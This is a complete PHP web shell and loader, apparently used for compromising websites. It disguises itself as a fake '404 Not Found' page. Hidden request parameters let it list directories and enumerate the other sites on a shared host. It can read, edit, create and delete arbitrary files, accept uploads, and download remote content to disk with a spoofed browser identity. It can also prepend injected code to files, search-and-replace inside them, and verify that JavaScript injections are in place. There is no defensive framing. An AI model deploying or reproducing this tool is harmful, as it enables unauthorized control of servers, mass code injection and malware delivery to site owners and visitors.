<?php


 if(@$_GET['work'] or @$_GET['go']){

    echo '<form method="post" action="">
	<center> | Opendir - <b>./</b> | Scandir - <b>./</b> | Glob <b>./*</b> | <br>
	<input name="path_to_file" type="text" value="'.@$_POST['path_to_file'].'" size="100"> <input type="submit" name="php_glob" value="PHP Glob"><br>
	<input type="submit" name="od" value="Opendir"> |
	<input type="submit" name="scandir" value="PHP Scandir"> |
	<input type="submit" name="cr" value="Create New File"> |
	<input type="submit" name="edit" value="Edit This File"></center>
	</form><br>';
	echo "<center>".$_SERVER['DOCUMENT_ROOT'].$_SERVER['SCRIPT_NAME']."</center><br><br>";

 }


  if(@$_GET['hosts']){

	$this_host = trim($_GET['hosts']);
	$homedir_path = $_SERVER['DOCUMENT_ROOT'];

	if(stristr($homedir_path,$this_host)){
		preg_match_all("!(.*?)$this_host(.*?)!siU", $homedir_path, $arr);

		$allsites_home = $arr[1][0]."/";
		$addiction_dir = "/".$arr[2][0]."/";

		$allsites_home = str_replace("////","/",$allsites_home);
		$allsites_home = str_replace("///","/",$allsites_home);
		$allsites_home = str_replace("//","/",$allsites_home);
		$addiction_dir = str_replace("////","/",$addiction_dir);
		$addiction_dir = str_replace("///","/",$addiction_dir);
		$addiction_dir = str_replace("//","/",$addiction_dir);

		$all_folders_glob = glob($allsites_home."*");

		if(stristr(implode($all_folders_glob),$this_host)==false){

             if ($handle = opendir($allsites_home)) {
    			while (false !== ($file = readdir($handle))) {
   	     		if ($file != "." && $file != "..") {
  	          	  $all_folders_glob[] = $allsites_home.$file;
   	     		}
   	   	  	  }
  	 			closedir($handle);
	 		}
		}

		$all_folders = str_replace($allsites_home,"",$all_folders_glob);

         for  ($i=0; $i<count($all_folders); $i++){

         	if(stristr($all_folders[$i],".")){

         		$only_hosts[] = trim($all_folders[$i]);
         	}
         }
         echo "<data><hosts>".implode(",",$only_hosts)."</hosts><homepath>".$allsites_home."</homepath><addiction>".$addiction_dir."</addiction></data>";
	}
	exit("");
 }

 if(@$_POST['scandir']){

	$q = stripslashes($_POST['path_to_file']);

	echo implode("<br>",scandir($q));
 }

  if(@$_POST['od']){

	$q = stripslashes($_POST['path_to_file']);

	if ($handle = opendir($q)) {
    			while (false !== ($file = readdir($handle))) {
   	     		if ($file != "." && $file != "..") {
  	          	  $res[] = $q.$file;
   	     		}
   	   	  	  }
  	 			closedir($handle);
	}

	echo implode("<br>",$res);
 }


 if(@$_POST['php_glob']){

	$q = stripslashes($_POST['path_to_file']);

	echo "<php_glob>".implode("<br>",glob($q))."</php_glob>";
 }

 if(@$_POST['edit']){

    if(file_exists($_POST['path_to_file'])){
    	echo '';
    } else {
    	exit ('<br /><br>File <big><b>'.$_POST['path_to_file'].'</b></big> not found!');
    }

    echo '<form method="post" action="">
    <center><b><big>'.$_POST['path_to_file'].'</big></b><br><textarea rows="30" name="data" cols="110">';
    //echo file_get_contents($_POST['dir_path'].$_POST['fname']);
    echo implode("",file($_POST['path_to_file']));
    echo'</textarea><br>';
    //echo '<input name="userfile" type="file"><input type="submit" name="upl" value="Upload"> | ';
    echo '<input name="ssl" type="checkbox" checked>Strip slashes<br /><br />';
    echo '<input type="submit" name="write" value="Write">';
    echo '<input name="path_to_file" type="hidden" value="'.$_POST['path_to_file'].'">';
    echo '</center></form>';
 }

 if(@$_POST['write']){

    if($_POST['ssl']){

   		$str = stripslashes($_POST["data"]);

    } else {

        $str = $_POST["data"];

    }

	$file_out=fopen($_POST['path_to_file'],"w");
	fwrite($file_out,$str);
	fclose($file_out);

	$prov = file(trim($_POST['path_to_file']));

	if($_POST['ssl']){
	 			if(strstr(implode("",$prov),stripslashes($str))==true){
                	echo $_POST['path_to_file']." ....... <font color=#008000 ><b><big>[SUCCESS]</big></b></font><br />";
                } else {
                	echo $_POST['path_to_file']." ....... <font color=#FF0000 ><b><big>[FAILED]</big></b></font><br />";
                }

	} else {

	  			if(strstr(implode("",$prov),$str)==true){
                	echo $_POST['path_to_file']." ....... <font color=#008000 ><b><big>[SUCCESS]</big></b></font><br />";
                } else {
                	echo $_POST['path_to_file']." ....... <font color=#FF0000 ><b><big>[FAILED]</big></b></font><br />";
                }
	}

    //echo 'Save changes ... [Done]<br />';
 }

 if(@$_POST['cr']){

    echo '<form method="post" action="">
    <center><b><big>'.$_POST['path_to_file'].'</big></b><br><textarea rows="30" name="data" cols="110"></textarea><br>';
    //echo '<input name="userfile" type="file"><input type="submit" name="upl" value="Upload"> | ';
    echo '<input name="ssl" type="checkbox" checked>Strip slashes<br /><br />';
    echo '<input type="submit" name="crf" value="Create File">';
    echo '<input name="path_to_file" type="hidden" value="'.$_POST['path_to_file'].'">';
    echo '</center></form>';
 }

 if(@$_POST['crf']){

 	if($_POST['ssl']){

   		$str = stripslashes($_POST['data']);

    } else {

        $str = $_POST['data'];

    }

 	 $file_out=fopen(stripslashes(trim($_POST['path_to_file'])),"w");
 	 fwrite($file_out,$str);
 	 fclose($file_out);

 	 if(file_exists(trim($_POST['path_to_file']))){

 	 	echo "File: ".trim($_POST['path_to_file'])."<font color=#008000 ><b><big> Created!</big></b></font><br />";

 	 } else {

 	    echo "File: ".trim($_POST['path_to_file'])."<font color=#A8A8A8 ><b><big> FAILED TO CREATE!</big></b></font><br />";

 	 }
 }

 if(@$_GET['work'] or @$_GET['go']){

	exit("");
 }

////////////////////////////////////////////////////Функции загрузчика////////////////////////////////////////
 if(@$_GET['check']){
   $resp = str_replace("failed","ok","its_failed");
   exit ($resp);
 }

 if(@$_GET['checkdir']){
   if (file_exists(rawurldecode($_GET['checkdir']))) {

		exit("Directory <b>".rawurldecode($_GET['checkdir'])."</b> exists!");

		} else {
    	mkdir(rawurldecode($_GET['checkdir']), 0755, true);

    	if (file_exists(rawurldecode($_GET['checkdir']))) {

    		exit("Directory <b>".rawurldecode($_GET['checkdir'])."</b> created!");
    	} else {
    		exit("Create directory <b>".rawurldecode($_GET['checkdir'])."</b> FAILED!");
    	}
   }
 }

 if(@$_GET['fname'] and @$_GET['testfile']){

	$file_out=fopen(rawurldecode($_GET['fname'])."w.txt","w");
	fwrite($file_out,"welcome!");
	fclose($file_out);

	if(file_exists(rawurldecode($_GET['fname'])."w.txt")){

	   		exit ("<answer>upload_ok</answer>");
	} else {
	        exit ("<answer>upload_failed</answer>");
	}
 }

 if(@$_GET['fname'] and @$_GET['deletetestfile']){

	unlink(rawurldecode($_GET['fname'])."w.txt");

	if(file_exists(rawurldecode($_GET['fname'])."w.txt")){

	   		exit ("<answer>delete_failed</answer>");
	} else {
	        exit ("<answer>delete_ok</answer>");
	}
 }


   if(@$_POST['dirname']){

  	$uploaddir = $_POST['dirname'];
	$uploadfile = $uploaddir.$_POST['fname'];
    //echo "<pre>";
	if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
    	echo "upload_ok";
	} else {
    	echo "upload_FAILED";
	}
    //print_r($_FILES);
    //echo "<i>".$uploadfile."</i>";
	exit("");
 }


 if(@$_POST['proverka_js'] and @$_POST['prov']){


   if(file_exists(trim($_POST['proverka_js']))){

		$fsource = file_get_contents(trim($_POST['proverka_js']));

		if(stristr($fsource,trim($_POST['prov']))){

		    echo trim($_POST['proverka_js'])."<font color=#008000 ><b><big> js_code_found </big></b></font><br />";
		} else {

		   echo trim($_POST['proverka_js'])."<font color=#A8A8A8 ><b><big> js_code_not_found</big></b></font><br />";
		}

   } else {

 	    echo "File: ".trim($_POST['proverka_js'])."<font color=#A8A8A8 ><b><big> NOT EXIST!!</big></b></font><br />";

   }


 }


 if(@$_POST['vnach'] and @$_POST['prov'] and @$_POST['path_to_file']){

 	if($_POST['ssl']){

   		$str = stripslashes($_POST['vnach']);

    } else {

        $str = $_POST['vnach'];

    }

 	 if(file_exists(trim($_POST['path_to_file']))){

		$fsource = file_get_contents(trim($_POST['path_to_file']));

		$file_out=fopen(trim($_POST['path_to_file']),"w");
		fwrite($file_out,$str." ".$fsource);
		fclose($file_out);

		$fsource = file_get_contents(trim($_POST['path_to_file']));

		if(stristr($fsource,trim($_POST['prov']))){

		    echo trim($_POST['path_to_file'])."<font color=#008000 ><b><big> file_is_changed </big></b></font><br />";
		} else {

		   echo trim($_POST['path_to_file'])."<font color=#A8A8A8 ><b><big> file_is_not_changed</big></b></font><br />";
		}

 	 } else {

 	    echo "File: ".trim($_POST['path_to_file'])."<font color=#A8A8A8 ><b><big> NOT EXIST!!</big></b></font><br />";

 	 }

 }

  if(@$_POST['zamena'] and @$_POST['chto'] and @$_POST['chem'] and @$_POST['prov']){

    if(file_exists(trim($_POST['zamena']))){

        $fsource = file_get_contents(trim($_POST['zamena']));

        if(stristr($fsource,trim($_POST['chto']))){

        $fsource = str_ireplace(trim($_POST['chto']),trim($_POST['chem']),$fsource);

        $file_out=fopen(trim($_POST['zamena']),"w");
		fwrite($file_out,$fsource);
		fclose($file_out);

		$fsource = file_get_contents(trim($_POST['zamena']));

		if(stristr($fsource,trim($_POST['prov']))){

		    echo trim($_POST['zamena'])."<font color=#008000 ><b><big> replace_ok </big></b></font><br />";
		} else {

		   echo trim($_POST['zamena'])."<font color=#A8A8A8 ><b><big> replace_failed</big></b></font><br />";
		}

       } else {

          echo trim($_POST['zamena'])."<font color=#A8A8A8 ><b><big> replace_failed (text not found)</big></b></font><br />";
       }
    } else {

 	    echo "File: ".trim($_POST['path_to_file'])."<font color=#A8A8A8 ><b><big> NOT EXIST!!</big></b></font><br />";
	}
  }

 if(@$_POST['delete_this_file']){

 	if(file_exists(trim($_POST['delete_this_file']))){

		if(unlink(trim($_POST['delete_this_file']))){

		   exit ("<answer><font color=#008000><b>File ".trim($_POST['delete_this_file'])." deleted</b></font></answer>");
		} else {

		   exit ("<answer>".trim($_POST['delete_this_file'])." something wrong</answer>");
		}

	} else {
	   	exit ("<answer><font color=#FF0000><b>File ".trim($_POST['delete_this_file'])." file not found</answer>");
	}

 }

 if(@$_GET['fname'] and @$_GET['url']){

  	$data = file_get_contents(rawurldecode($_GET['url']));

 	$file_out=fopen($_GET['fname'],"w");
	fwrite($file_out,$data);
	fclose($file_out);

		if(file_exists($_GET['fname'])){
	   		exit ("<answer>upload_ok</answer>");
		} else {

			$curl = curl_init();
			curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
			curl_setopt($curl,CURLOPT_URL, rawurldecode($_GET['url']));
			curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
			curl_setopt($curl,CURLOPT_USERAGENT,  "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00");
			curl_setopt($curl,CURLOPT_REFERER, "http://www.google.com/");
			curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,25);
			curl_setopt($curl,CURLOPT_TIMEOUT,25);
			$data=curl_exec($curl);
			curl_close($curl);

 			$file_out=fopen($_GET['fname'],"w");
			fwrite($file_out,$data);
			fclose($file_out);

			if(file_exists($_GET['fname'])){
				exit ("<answer>upload_ok</answer>");
			} else {
	   			exit ("<answer>upload_failed</answer>");
			}
		}

 } else {

  echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>404 Not Found</title>
  </head><body>
  <h1>Not Found</h1>
  <p>The requested URL '.$_SERVER['REQUEST_URI'].' was not found on this server.</p>
  </body><!-- Inactive! --></html>';

 }
?>
